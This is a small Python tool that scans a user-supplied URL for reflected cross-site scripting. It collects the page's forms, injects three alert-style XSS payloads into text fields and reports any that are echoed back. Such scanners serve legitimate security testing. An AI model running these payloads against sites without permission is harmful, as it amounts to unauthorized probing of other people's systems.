import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style

class MandeshWebScan:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.xss_payloads = ["<script>alert('XSS')</script>", "';alert(1)//", "<img src=x onerror=alert(1)>"]

    def get_all_forms(self):
        # Extract all forms to test for injection points
        soup = BeautifulSoup(self.session.get(self.url).content, "html.parser")
        return soup.find_all("form")

    def test_xss(self):
        print(f"{Fore.CYAN}[*] Scanning for XSS vulnerabilities...{Style.RESET_ALL}")
        forms = self.get_all_forms()
        print(f"[!] Found {len(forms)} forms on page.")
        
        for form in forms:
            details = self.get_form_details(form)
            for payload in self.xss_payloads:
                res = self.submit_form(details, payload)
                if payload in res.text:
                    print(f"{Fore.GREEN}[+] XSS Detected in form at {self.url}{Style.RESET_ALL}")
                    print(f"  [>] Payload: {payload}")
                    break

    def get_form_details(self, form):
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            inputs.append({"type": input_tag.attrs.get("type", "text"), "name": input_tag.attrs.get("name")})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def submit_form(self, form_details, value):
        target_url = self.url + form_details["action"]
        data = {}
        for input in form_details["inputs"]:
            if input["type"] == "text" or input["type"] == "search":
                data[input["name"]] = value
            else:
                data[input["name"]] = "test"
        if form_details["method"] == "post":
            return self.session.post(target_url, data=data)
        return self.session.get(target_url, params=data)

if __name__ == "__main__":
    target = input("Enter URL to scan (e.g., http://example.com/): ")
    scanner = MandeshWebScan(target)
    scanner.test_xss()
